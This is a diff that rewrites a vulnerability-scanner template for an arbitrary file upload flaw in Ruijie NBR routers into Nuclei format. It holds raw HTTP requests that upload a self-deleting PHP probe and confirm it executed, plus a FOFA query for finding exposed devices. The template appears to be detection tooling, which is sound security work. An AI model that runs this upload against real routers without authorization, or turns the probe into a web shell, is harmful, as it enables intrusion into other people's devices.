@@ -1,38 +1,42 @@
 id: ruijie-nbr-fileupload
 
 info:
-  name: 锐捷 NBR 路由器 fileupload.php 任意文件上传漏洞
-  author: peiqi
-  severity: high
-  verified: true
+  name: Ruijie NBR fileupload.php - Arbitrary File Upload
+  author: SleepingBag945
+  severity: critical
   description: |
-    锐捷 NBR 路由器 fileupload.php文件存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件到服务器获取服务器权限
-    FOFA: app="Ruijie-NBR路由器"
+    Ruijie NBR router fileupload.php file has an arbitrary file upload vulnerability. An attacker can upload any file to the server through the vulnerability to obtain server permissions.
   reference:
-    - https://peiqi.wgpsec.org/wiki/iot/锐捷/锐捷%20NBR%20路由器%20fileupload.php%20任意文件上传漏洞.html
-  tags: ruijie,fileupload
-  created: 2023/08/10
+    - https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/ruijie-nbr-fileupload.yaml
+  classification:
+    cwe-id: CWE-434
+  metadata:
+    verified: true
+    max-request: 2
+    fofa-query: app="Ruijie-NBR路由器"
+  tags: ruijie,fileupload,intrusive,nbr,vuln
 
-set:
-  r1: randomLowercase(6)
-  r2: md5(r1)
-rules:
-  r0:
-    request:
-      method: POST
-      path: /ddi/server/fileupload.php?uploadDir=../../321&name={{r1}}.php
-      headers:
+variables:
+  filename: "{{rand_base(6)}}"
+  string: "ruijie-nbr-fileupload"
+
+http:
+  - raw:
+      - |
+        POST /ddi/server/fileupload.php?uploadDir=upload&name={{filename}}.php HTTP/1.1
+        Host: {{Hostname}}
         Accept: text/plain, */*; q=0.01
-        Content-Disposition: form-data; name="file"; filename="111.php"
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.php"
         Content-Type: image/jpeg
-      body: |
-        <?php echo md5("{{r1}}");unlink(__FILE__);?>
-    expression: |
-      response.status == 200 && 
-      response.body.bcontains(b'"jsonrpc"') 
-  r1:
-    request:
-      method: GET
-      path: /321/{{r1}}.php
-    expression: response.status == 200 && response.body.bcontains(bytes(r2))
-expression: r0() && r1()
+
+        <?php echo md5("{{string}}");unlink(__FILE__);?>
+      - |
+        GET /ddi/server/upload/{{filename}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body_2
+        words:
+          - '{{md5(string)}}'
+# digest: 4b0a00483046022100ac88086de9353d0888222797d98907ff18afd91fba7b943816dd181b93435174022100ff5f1f2c59fce236d167d5f4b4db1d4d48eaa447b60949b24d7e20c519e47f5c:922c64590222798bb761d5b6d8e72950
